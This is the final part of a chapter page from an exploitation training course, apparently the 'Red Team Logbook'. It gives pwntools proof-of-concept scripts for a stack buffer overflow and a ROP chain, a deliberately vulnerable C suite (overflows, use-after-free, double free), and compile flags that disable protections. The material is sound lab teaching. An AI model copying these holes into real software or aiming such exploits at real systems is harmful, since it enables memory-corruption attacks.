<h3>PoC - Stack Buffer Overflow</h3>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;info&#39;</span><span class="p">)</span>

<span class="c1"># Generate crash and find offset</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln_no_protect&#39;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">200</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
<span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">corefile</span><span class="o">.</span><span class="n">pc</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Offset: </span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># Final payload</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">fit</span><span class="p">({</span><span class="n">offset</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">win_function</span><span class="p">)})</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div>

<h2>5.7. 4.7 Capstone Project: Complete Analysis Pipeline</h2>
<h3>Vulnerable Test Suite</h3>
<div class="codehilite"><pre><span></span><code><span class="c1">// vulnerable_suite.c</span>
<span class="kt">void</span><span class="w"> </span><span class="nf">stack_overflow</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">input</span><span class="p">);</span><span class="w">  </span><span class="c1">// No check</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">heap_overflow</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">input</span><span class="p">);</span><span class="w">  </span><span class="c1">// Overflow</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">use_after_free</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ptr</span><span class="p">);</span><span class="w">  </span><span class="c1">// UAF</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">double_free</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span><span class="w">  </span><span class="c1">// Double free</span>
<span class="p">}</span>
</code></pre></div>

<p><strong>Compilation:</strong></p>
<div class="codehilite"><pre><span></span><code>gcc<span class="w"> </span>-g<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-no-pie<span class="w"> </span>vulnerable_suite.c<span class="w"> </span>-o<span class="w"> </span>vuln_no_protect
gcc<span class="w"> </span>-g<span class="w"> </span>-O1<span class="w"> </span>-fsanitize<span class="o">=</span>address<span class="w"> </span>vulnerable_suite.c<span class="w"> </span>-o<span class="w"> </span>vuln_asan
</code></pre></div>

<h3>Binary with ROP Gadgets</h3>
<p>A special binary with ROP (Return-Oriented Programming) gadgets is provided to facilitate exploitation.</p>
<h3>Complete Exploit</h3>
<p>It is demonstrated how to build a ROP chain to call a <code>win()</code> or <code>spawn_shell()</code> function.</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./vuln_no_protect&#39;</span><span class="p">)</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rdi&#39;</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;win&#39;</span><span class="p">]))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">fit</span><span class="p">({</span><span class="n">offset</span><span class="p">:</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()})</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div>

<h2>5.8. Chapter 5 Conclusions</h2>
<ol>
<li><strong>Sanitizers are essential</strong> - They convert silent bugs into informative crashes.</li>
<li><strong>Automation accelerates triage</strong> - CASR classifies crashes at scale.</li>
<li><strong>Root cause analysis requires multiple techniques</strong> - Debuggers, tracing, coverage.</li>
<li><strong>Reproducible PoCs are critical</strong> - They document the vulnerability.</li>
<li><strong>Practice with vulnerable binaries develops skills</strong>.</li>
</ol>
<h3>Discussion Questions:</h3>
<ol>
<li>How do compiler protections affect exploitation strategy?</li>
<li>When is it preferable to use ASAN vs PageHeap vs pure binary analysis?</li>
<li>How do you assess crash exploitability without direct RIP control?</li>
</ol>
            </article>
            
            <!-- Navigation -->
            <div class="nav-buttons">
                <a href="index.html" class="nav-btn nav-home">
        <i class="fas fa-home"></i>
        <span>Home</span>
    </a><a href="01-introduction.html" class="nav-btn nav-next">
            <span>Next</span>
            <i class="fas fa-chevron-right"></i>
        </a>
            </div>
            
            <!-- Footer -->
            <footer class="page-footer">
                <p>© 2024 Red Team Logbook | <a href="https://github.com/mburgc/mburgc.github.io" target="_blank">
                    <i class="fab fa-github"></i> mburgc
                </a></p>
            </footer>
        </div>
    </main>
    
    
<script>
document.addEventListener('DOMContentLoaded', function() {
    // Search functionality
    const searchInput = document.getElementById('searchbar');
    const searchBtn = document.getElementById('search-btn');
    
    function performSearch() {
        let input = searchInput.value.toLowerCase().trim();
        let content = document.querySelector('.content-area');
        let paragraphs = content.getElementsByTagName('p');
        let lis = content.getElementsByTagName('li');
        let headers = content.querySelectorAll('h1, h2, h3, h4, h5, h6');
        let codeBlocks = content.querySelectorAll('pre, code');
        
        let all_elements = [...paragraphs, ...lis, ...headers, ...codeBlocks];
        
        // Reset all elements first
        for (let i = 0; i < all_elements.length; i++) {
            let el = all_elements[i];
            el.style.display = '';
            if (el.classList.contains('highlight')) {
                el.classList.remove('highlight');
                el.innerHTML = el.textContent;
            }
        }
        
        if (input === "") {
            return;
        }
        
        for (let i = 0; i < all_elements.length; i++) {
            let element = all_elements[i];
            let text = element.textContent.toLowerCase();
            if (text.includes(input)) {
                element.style.display = "";
                let originalText = element.textContent;
                let escaped = input.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
                let newText = originalText.replace(new RegExp('(' + escaped + ')', 'gi'), '<span class="search-highlight">$1</span>');
                element.innerHTML = newText;
            } else {
                element.style.display = "none";
            }
        }
        
        // Show no results message
        let visibleCount = 0;
        for (let i = 0; i < all_elements.length; i++) {
            if (all_elements[i].style.display !== "none") visibleCount++;
        }
        
        let noResults = document.getElementById('no-results');
        if (visibleCount === 0) {
            if (!noResults) {
                noResults = document.createElement('div');
                noResults.id = 'no-results';
                noResults.className = 'no-results';
                noResults.innerHTML = '<i class="fas fa-search"></i> No se encontraron resultados / No results found';
                content.insertBefore(noResults, content.firstChild);
            }
            noResults.style.display = 'block';
        } else if (noResults) {
            noResults.style.display = 'none';
        }
    }
    
    if (searchBtn) {
        searchBtn.addEventListener('click', performSearch);
    }
    if (searchInput) {
        searchInput.addEventListener('keyup', function(e) {
            if (e.key === 'Enter') performSearch();
            if (this.value === '') {
                let all_elements = document.querySelectorAll('.search-highlight');
                all_elements.forEach(el => {
                    let parent = el.parentNode;
                    parent.innerHTML = parent.textContent;
                });
                let noResults = document.getElementById('no-results');
                if (noResults) noResults.style.display = 'none';
            }
        });
    }
    
    // Mobile menu toggle
    const menuToggle = document.getElementById('menu-toggle');
    const sidebar = document.querySelector('.sidebar');
    const overlay = document.querySelector('.sidebar-overlay');
    
    if (menuToggle) {
        menuToggle.addEventListener('click', function() {
            sidebar.classList.toggle('active');
            overlay.classList.toggle('active');
        });
    }
    
    if (overlay) {
        overlay.addEventListener('click', function() {
            sidebar.classList.remove('active');
            overlay.classList.remove('active');
        });
    }
    
    // Scroll animations
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('visible');
            }
        });
    }, observerOptions);
    
    document.querySelectorAll('.content-area > *').forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(20px)';
        el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(el);
    });
    
    // Trigger initial animation
    setTimeout(() => {
        document.querySelectorAll('.content-area > *').forEach((el, index) => {
            setTimeout(() => {
                el.style.opacity = '1';
                el.style.transform = 'translateY(0)';
            }, index * 50);
        });
    }, 100);
    
    // Table of contents highlighting
    const tocLinks = document.querySelectorAll('.toc-link');
    const contentHeaders = document.querySelectorAll('.content-area h1, .content-area h2, .content-area h3');
    
    window.addEventListener('scroll', () => {
        let current = '';
        contentHeaders.forEach(header => {
            const headerTop = header.offsetTop;
            if (window.pageYOffset >= headerTop - 100) {
                current = header.getAttribute('id');
            }
        });
        
        tocLinks.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href') === '#' + current) {
                link.classList.add('active');
            }
        });
    });
});
</script>

</body>
</html>